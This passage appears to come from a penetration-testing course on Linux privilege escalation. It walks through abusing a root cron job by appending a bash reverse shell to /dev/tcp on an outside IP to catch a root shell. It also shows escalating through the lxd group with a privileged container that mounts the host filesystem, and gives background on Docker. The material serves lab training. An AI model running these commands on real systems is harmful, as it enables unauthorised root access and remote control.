-rwxrwxrwx <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 230 </span>Aug<span class="hljs-number"> 31 </span>02:39 backup.sh
-rw-r--r-- <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3336 </span>Aug<span class="hljs-number"> 31 </span>02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r-- <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3336 </span>Aug<span class="hljs-number"> 31 </span>02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r-- <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3336 </span>Aug<span class="hljs-number"> 31 </span>02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r-- <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3336 </span>Aug<span class="hljs-number"> 31 </span>02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r-- <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3336 </span>Aug<span class="hljs-number"> 31 </span>02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r-- <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3336 </span>Aug<span class="hljs-number"> 31 </span>02:39 www-backup-2020831-02:39:01.tgz
</code></pre>
<p>We can confirm that a cron job is running using <a href="https://github.com/DominicBreuker/pspy">pspy</a>, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning <a href="https://en.wikipedia.org/wiki/Procfs">procfs</a>.</p>
<p>Let&#39;s run <code>pspy</code> and have a look. The <code>-pf</code> flag tells the tool to print commands and file system events and <code>-i 1000</code> tells it to scan <a href="https://man7.org/linux/man-pages/man5/procfs.5.html">profcs</a> every 1000ms (or every second).</p>
<p>Cron Job Abuse</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ./</span>pspy64 -pf -i <span class="hljs-number">1000</span>

pspy - <span class="hljs-string">version:</span> v1<span class="hljs-number">.2</span><span class="hljs-number">.0</span> - Commit <span class="hljs-string">SHA:</span> <span class="hljs-number">9</span>c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
<span class="hljs-symbol">
Config:</span> Printing events (colored=<span class="hljs-literal">true</span>): processes=<span class="hljs-literal">true</span> | file-system-events=<span class="hljs-literal">true</span> ||| Scannning <span class="hljs-keyword">for</span> processes every <span class="hljs-number">1</span>s and on inotify events ||| Watching <span class="hljs-string">directories:</span> [<span class="hljs-regexp">/usr /</span>tmp <span class="hljs-regexp">/etc /</span>home <span class="hljs-regexp">/var /</span>opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">999</span>    | <span class="hljs-regexp">/usr/</span>bin/VGAuthService 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">111</span>  PID=<span class="hljs-number">990</span>    | <span class="hljs-regexp">/usr/</span>bin/dbus-daemon --system --address=<span class="hljs-string">systemd:</span> --nofork --nopidfile --systemd-activation 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">99</span>     | 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">988</span>    | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/snapd/</span>snapd 

&lt;SNIP&gt;

<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">1017</span>   | <span class="hljs-regexp">/usr/</span>sbin/cron -f 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">1010</span>   | <span class="hljs-regexp">/usr/</span>sbin/atd -f 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">1003</span>   | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/accountsservice/</span>accounts-daemon 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">1001</span>   | <span class="hljs-regexp">/lib/</span>systemd/systemd-logind 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">10</span>     | 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">1</span>      | <span class="hljs-regexp">/sbin/</span>init 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">FS:</span>                 OPEN | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">2201</span>   | <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/dmz-backups/</span>backup.sh 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">2200</span>   | <span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-regexp">/dmz-backups/</span>backup.sh 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">FS:</span>                 OPEN | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>gconv/gconv-modules.cache
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">2199</span>   | <span class="hljs-regexp">/usr/</span>sbin/CRON -f 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">FS:</span>                 OPEN | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">2203</span>   | 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">FS:</span>        CLOSE_NOWRITE | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">FS:</span>                 OPEN | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">FS:</span>        CLOSE_NOWRITE | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">2204</span>   | tar --absolute-names --create --gzip --file=<span class="hljs-regexp">/dmz-backups/</span>www-backup<span class="hljs-number">-202094</span><span class="hljs-number">-20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01.</span>tgz <span class="hljs-regexp">/var/</span>www/html 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">FS:</span>                 OPEN | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">2205</span>   | gzip 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">03</span> <span class="hljs-string">FS:</span>        CLOSE_NOWRITE | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">03</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">0</span>    PID=<span class="hljs-number">2206</span>   | <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/dmz-backups/</span>backup.sh 
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">03</span> <span class="hljs-string">FS:</span>        CLOSE_NOWRITE | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>gconv/gconv-modules.cache
<span class="hljs-number">2020</span><span class="hljs-regexp">/09/</span><span class="hljs-number">04</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">03</span> <span class="hljs-string">FS:</span>        CLOSE_NOWRITE | <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/locale/</span>locale-archive
</code></pre>
<p>From the above output, we can see that a cron job runs the <code>backup.sh</code> script located in the <code>/dmz-backups</code> directory and creating a tarball file of the contents of the <code>/var/www/html</code> directory.</p>
<p>We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to <code>ALWAYS</code> take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.</p>
<p>Cron Job Abuse</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /dmz-backups/backup.sh 

<span class="hljs-meta">#!/bin/bash</span>
 SRCDIR=<span class="hljs-string">"/var/www/html"</span>
 DESTDIR=<span class="hljs-string">"/dmz-backups/"</span>
 FILENAME=www-backup-$(date +%-Y%-m%<span class="hljs-_">-d</span>)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=<span class="hljs-variable">$DESTDIR</span><span class="hljs-variable">$FILENAME</span> <span class="hljs-variable">$SRCDIR</span>
</code></pre>
<p>We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let&#39;s modify the script to add a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Bash one-liner reverse shell</a>.</p>
<p>Code: bash</p>
<pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash</span>
SRCDIR=<span class="hljs-string">"/var/www/html"</span>
DESTDIR=<span class="hljs-string">"/dmz-backups/"</span>
FILENAME=www-backup-$(date +%-Y%-m%<span class="hljs-_">-d</span>)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=<span class="hljs-variable">$DESTDIR</span><span class="hljs-variable">$FILENAME</span> <span class="hljs-variable">$SRCDIR</span>

bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
</code></pre>
<p>We modify the script, stand up a local <code>netcat</code> listener, and wait. Sure enough, within three minutes, we have a root shell!</p>
<p>Cron Job Abuse</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lnvp <span class="hljs-number">443</span>

listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">443</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">2.12</span>] <span class="hljs-number">38882</span>
bash: cannot set terminal process group (<span class="hljs-number">9143</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device
bash: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> shell

root@NIX02:~<span class="hljs-comment"># id</span>
id
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)

root@NIX02:~<span class="hljs-comment"># hostname</span>
hostname
NIX02
</code></pre>
<p>While not the most common attack, we do find poorly configured cron jobs that can be abused from time to time.</p>
<h2 id="containers">Containers</h2>
<hr>
<p>Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.</p>
<p>Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. For example, they facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. Another example would be the isolation of processes that usually require root privileges. Such an application could be a web application or API that must be isolated from the host system to prevent escalation to databases.</p>
<hr>
<h3 id="linux-containers">Linux Containers</h3>
<p>Linux Containers (<code>LXC</code>) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.</p>
<p>By default, <code>LXC</code> consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously. A platform with <code>LXC</code> can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer&#39;s system will work on any other system. In addition, large applications can be started, stopped, or their environment variables changed via the Linux container interface.</p>
<p>The ease of use of <code>LXC</code> is their most significant advantage compared to classic virtualization techniques. However, the enormous spread of <code>LXC</code>, an almost all-encompassing ecosystem, and innovative tools are primarily due to the Docker platform, which established Linux containers. The entire setup, from creating container templates and deploying them, configuring the operating system and networking, to deploying applications, remains the same.</p>
<p><strong>Linux Daemon</strong></p>
<p>Linux Daemon (<a href="https://github.com/lxc/lxd">LXD</a>) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the <code>lxc</code> or <code>lxd</code> group. We can find this out with the following command:</p>
<p>Containers</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">container</span>-user@nix02:~$ id

uid=<span class="hljs-number">1000</span>(<span class="hljs-keyword">container</span>-user) gid=<span class="hljs-number">1000</span>(<span class="hljs-keyword">container</span>-user) groups=<span class="hljs-number">1000</span>(<span class="hljs-keyword">container</span>-user),<span class="hljs-number">116</span>(lxd)
</code></pre>
<p>From here on, there are now several ways in which we can exploit <code>LXC</code>/<code>LXD</code>. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.</p>
<p>Containers</p>
<pre><code class="lang-shell-session">container-user<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd ContainerImages
container-user<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls

ubuntu-template.tar.xz
</code></pre>
<p>Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.</p>
<p>Containers</p>
<pre><code class="lang-shell-session">container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

<span class="hljs-code">+-------------------------------------+</span>--------------<span class="hljs-code">+--------+</span>-----------------------------------------<span class="hljs-code">+--------------+</span>-----------------<span class="hljs-code">+-----------+</span>-------------------------------+
<span class="hljs-section">|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span>
<span class="hljs-section">| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span>
</code></pre>
<p>After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the <code>security.privileged</code> flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.</p>
<p>Containers</p>
<pre><code class="lang-shell-session">container-user<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>lxc init ubuntutemp privesc -c security.privileged=<span class="hljs-keyword">true</span>
container-user<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>lxc config device add privesc host-root disk source=<span class="hljs-regexp">/ path=/mnt</span><span class="hljs-regexp">/root recursive=true</span>
</code></pre>
<p>Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the <code>resource</code> of the host system as <code>root</code>.</p>
<p>Containers</p>
<pre><code class="lang-shell-session">container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~<span class="hljs-comment"># ls -l /mnt/root</span>

total 68
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 7 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>bin -&gt; usr/bin
drwxr-xr-x  <span class="hljs-number"> 4 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>11:34 boot
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 6 </span><span class="hljs-number"> 2021 </span>cdrom
drwxr-xr-x <span class="hljs-number"> 19 </span>root root <span class="hljs-number"> 3940 </span>Oct<span class="hljs-number"> 24 </span>13:28 dev
drwxr-xr-x<span class="hljs-number"> 100 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>13:27 etc
drwxr-xr-x  <span class="hljs-number"> 3 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>11:06 home
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 7 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>lib -&gt; usr/lib
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 9 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>lib32 -&gt; usr/lib32
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 9 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>lib64 -&gt; usr/lib64
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 10 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>libx32 -&gt; usr/libx32
drwx------  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 16384 </span>Oct <span class="hljs-number"> 6 </span><span class="hljs-number"> 2021 </span>lost+found
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 24 </span>13:28 media
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>mnt
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>opt
dr-xr-xr-x<span class="hljs-number"> 307 </span>root root    <span class="hljs-number"> 0 </span>Oct<span class="hljs-number"> 24 </span>13:28 proc
drwx------  <span class="hljs-number"> 6 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 26 </span>21:11 root
drwxr-xr-x <span class="hljs-number"> 28 </span>root root  <span class="hljs-number"> 920 </span>Oct<span class="hljs-number"> 24 </span>13:32 run
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 8 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>sbin -&gt; usr/sbin
drwxr-xr-x  <span class="hljs-number"> 7 </span>root root <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 7 </span><span class="hljs-number"> 2021 </span>snap
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>srv
dr-xr-xr-x <span class="hljs-number"> 13 </span>root root    <span class="hljs-number"> 0 </span>Oct<span class="hljs-number"> 24 </span>13:28 sys
drwxrwxrwt <span class="hljs-number"> 13 </span>root root <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 24 </span>13:44 tmp
drwxr-xr-x <span class="hljs-number"> 14 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>11:11 usr
drwxr-xr-x <span class="hljs-number"> 13 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>var
</code></pre>
<h2 id="docker">Docker</h2>
<hr>
<p>Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources. One advantage is that containerization thus consumes significantly fewer resources than a traditional server or virtual machine. The core feature of Docker is that applications are encapsulated in so-called Docker containers. They can thus be used for any operating system. A Docker container represents a lightweight standalone executable software package that contains everything needed to run an application code runtime.</p>
<hr>
<h3 id="docker-architecture">Docker Architecture</h3>
<p>At the core of the Docker architecture lies a client-server model, where we have two primary components:</p>
<ul>
<li>The Docker daemon</li>
<li>The Docker client</li>
</ul>
<p>The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.</p>
<p><strong>Docker Daemon</strong></p>
<p>The <code>Docker Daemon</code>, also known as the Docker server, is a critical part of the Docker platform that plays a pivotal role in container management and orchestration. Think of the Docker Daemon as the powerhouse behind Docker. It has several essential responsibilities like:</p>
<ul>
<li>running Docker containers</li>
<li>interacting with Docker containers</li>
<li>managing Docker containers on the host system.</li>
</ul>
<p><strong>Managing Docker Containers</strong></p>
<p>Firstly, it handles the core containerization functionality. It coordinates the creation, execution, and monitoring of Docker containers, maintaining their isolation from the host and other containers. This isolation ensures that containers operate independently, with their own file systems, processes, and network interfaces. Furthermore, it handles Docker image management. It pulls images from registries, such as <a href="https://hub.docker.com/">Docker Hub</a> or private repositories, and stores them locally. These images serve as the building blocks for creating containers.</p>
<p>Additionally, the Docker Daemon offers monitoring and logging capabilities, for example:</p>
<ul>
<li>Captures container logs</li>
<li>Provides insight into container activities, errors, and debugging information.</li>
</ul>
<p>The Daemon also monitors resource utilization, such as CPU, memory, and network usage, allowing us to optimize container performance and troubleshoot issues.</p>
<p><strong>Network and Storage</strong></p>
<p>It facilitates container networking by creating virtual networks and managing network interfaces. It enables containers to communicate with each other and the outside world through network ports, IP addresses, and DNS resolution. The Docker Daemon also plays a critical role in storage management, since it handles Docker volumes, which are used to persist data beyond the lifespan of containers and manages volume creation, attachment, and clean-up, allowing containers to share or store data independently of each other.</p>
<p><strong>Docker Clients</strong></p>
<p>When we interact with Docker, we issue commands through the <code>Docker Client</code>, which communicates with the Docker Daemon (through a <code>RESTful API</code> or a <code>Unix socket</code>) and serves as our primary means of interacting with Docker. We also have the ability to create, start, stop, manage, remove containers, search, and download Docker images. With these options, we can pull existing images to use as a base for our containers or build our custom images using Dockerfiles. We have the flexibility to push our images to remote repositories, facilitating collaboration and sharing within our teams or with the wider community.</p>
<p>In comparison, the Daemon, on the other hand, carries out the requested actions, ensuring containers are created, launched, stopped, and removed as required.</p>
<p>Another client for Docker is <code>Docker Compose</code>. It is a tool that simplifies the orchestration of multiple Docker containers as a single application. It allows us to define our application&#39;s multi-container architecture using a declarative <code>YAML</code> (<code>.yaml</code>/<code>.yml</code>) file. With it, we can specify the services comprising our application, their dependencies, and their configurations. We define container images, environment variables, networking, volume bindings, and other settings. Docker Compose then ensures that all the defined containers are launched and interconnected, creating a cohesive and scalable application stack.</p>
<p><strong>Docker Desktop</strong></p>
<p><code>Docker Desktop</code> is available for MacOS, Windows, and Linux operating systems and provides us with a user-friendly GUI that simplifies the management of containers and their components. This allows us to monitor the status of our containers, inspect logs, and manage the resources allocated to Docker. It provides an intuitive and visual way to interact with the Docker ecosystem, making it accessible to developers of all levels of expertise, and additionally, it supports Kubernetes.</p>
<hr>
<h3 id="docker-images-and-containers">Docker Images and Containers</h3>
<p>Think of a <code>Docker image</code> as a blueprint or a template for creating containers. It encapsulates everything needed to run an application, including the application&#39;s code, dependencies, libraries, and configurations. An image is a self-contained, read-only package that ensures consistency and reproducibility across different environments. We can create images using a text file called a <code>Dockerfile</code>, which defines the steps and instructions for building the image.</p>
<p>A <code>Docker container</code> is an instance of a Docker image. It is a lightweight, isolated, and executable environment that runs applications. When we launch a container, it is created from a specific image, and the container inherits all the properties and configurations defined in that image. Each container operates independently, with its own filesystem, processes, and network interfaces. This isolation ensures that applications within containers remain separate from the underlying host system and other containers, preventing conflicts and interference.</p>
<p>While <code>images</code> are immutable and <code>read-only</code>, while <code>containers</code> are mutable and <code>can be modified</code> during runtime. We can interact with containers, execute commands within them, monitor their logs, and even make changes to their filesystem or environment. However, any modifications made to a container&#39;s filesystem are not persisted unless explicitly saved as a new image or stored in a persistent volume.</p>
<hr>
<h3 id="docker-privilege-escalation">Docker Privilege Escalation</h3>
<p>What can happen is that we get access to an environment where we will find users who can manage docker containers. With this, we could look for ways how to use those docker containers to obtain higher privileges on the target system. We can use several ways and techniques to escalate our privileges or escape the docker container.</p>
<p><strong>Docker Shared Directories</strong></p>
<p>When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container&#39;s filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container. This is incredibly useful for persisting data, sharing code, and facilitating collaboration between development environments and Docker containers. However, it always depends on the setup of the environment and the goals that administrators want to achieve. To create a shared directory, a path on the host system and a corresponding path within the container is specified, creating a direct link between the two locations.</p>
<p>Shared directories offer several advantages, including the ability to persist data beyond the lifespan of a container, simplify code sharing and development, and enable collaboration within teams. It&#39;s important to note that shared directories can be mounted as read-only or read-write, depending on specific administrator requirements. When mounted as read-only, modifications made within the container won&#39;t affect the host system, which is useful when read-only access is preferred to prevent accidental modifications.</p>
